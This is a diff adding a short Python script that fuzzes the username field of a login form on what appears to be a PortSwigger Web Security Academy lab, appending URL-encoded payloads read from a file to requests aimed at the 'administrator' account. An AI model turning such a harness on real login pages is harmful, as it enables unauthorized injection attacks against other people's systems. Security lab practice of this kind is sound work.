@@ -1,0 +1,25 @@
+import requests
+import urllib
+
+url = "https://0a05008e04c019e681c4daa7002600ad.web-security-academy.net:443/login"
+cookies = {"session": "xWOalXlFB5jUAP42PbVrH3E0hFMm79ib"}
+data = {"csrf": "T5FpivQVdr42r29rP5QV41i9dCY7INA4", "username": "administrator", "password": "1234"}
+
+def check(url, cookies, data):
+    with open('payload.txt', 'r') as f:
+        payloads = f.readlines()
+        for payload in payloads:
+            # print(payload.strip())
+            for key, value in data.items():
+                if key == 'username':
+                    new_data = data.copy()
+                    new_data[key] = value + urllib.parse.quote(payload.strip())
+                    print(new_data)
+                    r = requests.post(url=url, cookies=cookies, data=new_data)
+                    print(r.status_code)
+                
+
+
+            # r = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data)
+
+check(url, cookies, data)
